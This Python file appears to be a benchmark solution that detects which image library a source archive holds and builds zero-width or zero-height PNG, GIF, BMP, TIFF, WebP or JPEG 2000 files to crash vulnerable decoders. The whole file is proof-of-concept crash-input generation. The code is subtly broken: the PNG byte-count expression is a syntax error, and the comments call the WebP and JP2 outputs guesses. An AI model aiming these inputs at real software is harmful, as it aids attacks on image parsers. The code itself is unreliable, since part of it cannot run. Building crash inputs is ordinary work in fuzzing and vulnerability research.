import os
import tarfile
import tempfile
import re
import struct
import zlib


class Solution:
    def _detect_project(self, src_path: str) -> str:
        try:
            with tarfile.open(src_path, 'r:*') as tf:
                names = tf.getnames()
        except Exception:
            return "png"
        lower_names = [n.lower() for n in names]
        def any_contains(substrs):
            for s in substrs:
                for n in lower_names:
                    if s in n:
                        return True
            return False

        # Heuristics to detect project type
        if any_contains(['libspng', 'spng.h', 'spng.c', 'spng/']):
            return "png"
        if any_contains(['libpng', 'pngpriv.h', 'png.h', 'pngrutil.c', 'png/']):
            return "png"
        if any_contains(['giflib', 'gif_lib.h', 'dgif_lib.c', 'gif/']):
            return "gif"
        if any_contains(['tiff', 'libtiff', 'tiffio.h', 'tif_']):
            return "tiff"
        if any_contains(['sdl_image', 'sdl2_image', 'img_']) or any_contains(['sdl_image.h', 'sdl_image.c']):
            return "bmp"
        if any_contains(['openjpeg', 'j2k', 'jp2', 'libopenjpeg']):
            return "jp2"
        if any_contains(['gdk-pixbuf', 'pixbuf', 'gdk-pixbuf-']):
            return "png"  # gdk-pixbuf supports many formats; PNG is a safe bet
        if any_contains(['stb_image', 'stb_image.h', 'stb_image.c']):
            return "png"
        if any_contains(['libwebp', 'webp/', 'webp/decode.h']):
            return "webp"
        # Default to PNG as a widely fuzzed image format
        return "png"

    def _chunk(self, ctype: bytes, data: bytes) -> bytes:
        return struct.pack(">I", len(data)) + ctype + data + struct.pack(">I", zlib.crc32(ctype + data) & 0xffffffff)

    def _make_png_zero_dim(self, zero='width', other_dim=1, color_type=0, bit_depth=8, interlace=0, rows=1) -> bytes:
        # zero: 'width' or 'height'
        if zero not in ('width', 'height'):
            zero = 'width'
        w = 0 if zero == 'width' else max(1, other_dim)
        h = 0 if zero == 'height' else max(1, rows)
        sig = b"\x89PNG\r\n\x1a\n"
        ihdr = struct.pack(">IIBBBBB", w, h, bit_depth, color_type, 0, 0, interlace)
        ihdr_chunk = self._chunk(b'IHDR', ihdr)

        # For PNG, each row has a leading filter byte even if width == 0.
        # Craft IDAT that expands to h filter bytes (zeros).
        raw = b"\x00" * (h if w == 0 else (h * (1 + ((w * (1 if color_type in (0,3)) else (3 if color_type == 2 else (4 if color_type in (4,6) else 1))) * bit_depth + 7)//8))))
        # Compress with zlib
        comp = zlib.compress(raw, 9)
        idat_chunk = self._chunk(b'IDAT', comp)
        iend_chunk = self._chunk(b'IEND', b'')
        return sig + ihdr_chunk + idat_chunk + iend_chunk

    def _make_gif_zero_dim(self, zero='width', other_dim=1) -> bytes:
        # Minimal GIF with zero width or height
        # Note: Crafting correct LZW stream is non-trivial. We'll provide minimal structure; many decoders will bail before LZW.
        w = 0 if zero == 'width' else max(1, other_dim)
        h = 0 if zero == 'height' else max(1, other_dim)
        header = b"GIF89a"
        lsd = struct.pack("<HHBBB", w, h, 0x81, 0, 0)  # GCT flag set with size=2 colors
        gct = b"\x00\x00\x00\xff\xff\xff"  # 2-color table
        # Image descriptor
        img_desc = b"\x2C" + struct.pack("<HHHHB", 0, 0, w, h, 0x00)
        # Minimal image data: LZW minimum code size + block terminator
        # Even if invalid due to zero dims, vulnerable decoders may hit zero-dimension paths.
        img_data = b"\x02" + b"\x01\x00" + b"\x00"
        trailer = b"\x3B"
        return header + lsd + gct + img_desc + img_data + trailer

    def _make_bmp_zero_dim(self, zero='width', other_dim=1, bpp=24) -> bytes:
        w = 0 if zero == 'width' else max(1, other_dim)
        h = 0 if zero == 'height' else max(1, other_dim)
        # BITMAPFILEHEADER (14 bytes) + BITMAPINFOHEADER (40 bytes)
        bfType = b'BM'
        bfOffBits = 54
        biSize = 40
        biPlanes = 1
        biCompression = 0
        biXPelsPerMeter = 0
        biYPelsPerMeter = 0
        biClrUsed = 0
        biClrImportant = 0
        biSizeImage = 0
        file_size = bfOffBits + biSizeImage
        file_header = bfType + struct.pack("<IHHI", file_size, 0, 0, bfOffBits)
        info_header = struct.pack("<IIIHHIIIIII",
                                  biSize, w & 0xffffffff, h & 0xffffffff, biPlanes, bpp,
                                  biCompression, biSizeImage, biXPelsPerMeter,
                                  biYPelsPerMeter, biClrUsed, biClrImportant)
        return file_header + info_header

    def _make_tiff_zero_dim(self, zero='width', other_dim=1) -> bytes:
        # Minimal TIFF (little-endian) with zero width or height
        # Header: 'II' 0x2A, offset to IFD at 8
        w = 0 if zero == 'width' else max(1, other_dim)
        h = 0 if zero == 'height' else max(1, other_dim)
        header = b'II' + struct.pack('<H', 42) + struct.pack('<I', 8)
        # IFD with entries: ImageWidth(256), ImageLength(257), BitsPerSample(258), Compression(259),
        # Photometric(262), StripOffsets(273), RowsPerStrip(278), StripByteCounts(279)
        # We'll store widths/length as LONG where needed
        entries = []
        def ifd_entry(tag, typ, count, value):
            # typ: 1=BYTE, 3=SHORT, 4=LONG
            if typ == 3 and count == 1 and value <= 0xFFFF:
                return struct.pack('<HHI4s', tag, typ, count, struct.pack('<H', value) + b'\x00\x00')
            elif typ == 4 and count == 1:
                return struct.pack('<HHI4s', tag, typ, count, struct.pack('<I', value))
            else:
                # Not handling complex types here
                return struct.pack('<HHI4s', tag, typ, count, struct.pack('<I', value))

        # Minimal data area after IFD
        data_area = b''
        # Entries
        entries.append(ifd_entry(256, 4, 1, w))  # ImageWidth
        entries.append(ifd_entry(257, 4, 1, h))  # ImageLength
        entries.append(ifd_entry(258, 3, 1, 8))  # BitsPerSample
        entries.append(ifd_entry(259, 3, 1, 1))  # Compression = none
        entries.append(ifd_entry(262, 3, 1, 2))  # PhotometricInterpretation = RGB (2)
        # Prepare strip
        strip_offset = 8 + 2 + len(entries) * 12 + 4 + len(data_area)
        entries.append(ifd_entry(273, 4, 1, strip_offset))  # StripOffsets
        entries.append(ifd_entry(278, 4, 1, max(1, h)))     # RowsPerStrip
        entries.append(ifd_entry(279, 4, 1, 0))             # StripByteCounts

        ifd_count = struct.pack('<H', len(entries))
        ifd_entries = b''.join(entries)
        next_ifd_offset = struct.pack('<I', 0)
        return header + ifd_count + ifd_entries + next_ifd_offset + data_area

    def _make_webp_zero_dim(self) -> bytes:
        # Construct a minimal VP8L (lossless) WebP with zero width or height in the bitstream.
        # VP8L header stores width-1 and height-1, so zero dimension implies encoded as 0xffff+1 which is invalid.
        # We'll produce a minimal RIFF container; decoders should reject properly in fixed versions.
        # Create a trivial payload that is invalid/small; vulnerable versions might mishandle zero dimension.
        riff = b'RIFF'
        webp = b'WEBP'
        # VP8L chunk header
        chunk = b'VP8L'
        # VP8L signature 0x2f; width/height 14 bits each; set to 0 -> width=1; Not zero.
        # Instead craft invalid header that may be interpreted as zero dims by buggy code.
        payload = b'\x2f' + b'\x00\x00\x00\x00'  # minimal header-like
        # Align to even size
        size = len(payload)
        pad = b'\x00' if size % 2 else b''
        chunk_size = struct.pack('<I', size)
        vp8l_chunk = chunk + chunk_size + payload + pad
        # RIFF size
        riff_size = struct.pack('<I', 4 + len(vp8l_chunk))
        return riff + riff_size + webp + vp8l_chunk

    def _make_jp2_zero_dim(self) -> bytes:
        # Minimal JP2 file is complex; craft basic boxes with impossible zero dimensions in ihdr equivalent.
        # Many decoders will reject. Vulnerable ones might mishandle.
        def box(t, data=b''):
            return struct.pack('>I4s', 8 + len(data), t) + data
        ftyp = box(b'ftyp', b'jp2 ' + b'\x00\x00\x00\x00' + b'jp2 ')
        # jp2h with ihdr: height and width fields (32-bit)
        # ihdr: height (0), width (1), nc (3), bpc (7), c (color), unkC, ipr
        ihdr = struct.pack('>IIHB5B', 0, 1, 3, 7, 7, 0, 0, 0, 0)  # simplified; not strictly valid
        ihdr_box = box(b'ihdr', ihdr)
        jp2h = box(b'jp2h', ihdr_box)
        # minimal contig codestream box
        jp2c = box(b'jp2c', b'\xff\x4f\xff\x51')  # SOC, SIZ marker start (truncated)
        return ftyp + jp2h + jp2c

    def solve(self, src_path: str) -> bytes:
        proj = self._detect_project(src_path)
        if proj == "png":
            # Create a PNG with zero-width and multiple rows to emphasize overflow potential, yet keep size small via compression.
            return self._make_png_zero_dim(zero='width', other_dim=1, color_type=0, bit_depth=8, interlace=0, rows=64)
        elif proj == "gif":
            return self._make_gif_zero_dim(zero='width', other_dim=1)
        elif proj == "tiff":
            return self._make_tiff_zero_dim(zero='width', other_dim=1)
        elif proj == "bmp":
            return self._make_bmp_zero_dim(zero='width', other_dim=1, bpp=24)
        elif proj == "jp2":
            return self._make_jp2_zero_dim()
        elif proj == "webp":
            return self._make_webp_zero_dim()
        else:
            # Fallback to PNG
            return self._make_png_zero_dim(zero='width', other_dim=1, color_type=0, bit_depth=8, interlace=0, rows=64)